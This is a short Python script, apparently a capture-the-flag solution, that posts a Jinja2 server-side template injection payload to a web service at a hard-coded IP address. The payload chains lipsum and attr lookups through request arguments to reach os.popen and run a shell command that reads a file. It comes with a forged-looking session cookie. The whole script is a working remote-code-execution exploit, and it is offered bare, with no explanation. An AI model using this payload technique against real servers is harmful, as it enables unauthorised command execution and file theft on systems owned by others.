import requests
url = "http://112.126.73.173:16340/nauygnoiqnebnat?a1=__globals__&a2=__getitem__&a3=os&a4=popen&a5=cat kGf5tN1yO8M&a6=read"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0"
}
cookies = {
    'session': 'eyJhbnN3ZXJzX2NvcnJlY3QiOnRydWV9.aCNc1g.225oksF1SoOiZPDdO7Pj3rfN3EQ'
}
payload="{{lipsum|attr(request.args.a1)|attr(request.args.a2)(request.args.a3)|attr(request.args.a4)((request.args.a5))|attr(request.args.a6)()}}"
try:
    resp = requests.post(url, headers=headers, cookies=cookies, timeout=10,
                         data={"yongzheng": payload})
    print(resp.text)
except Exception as e:
    print(e)
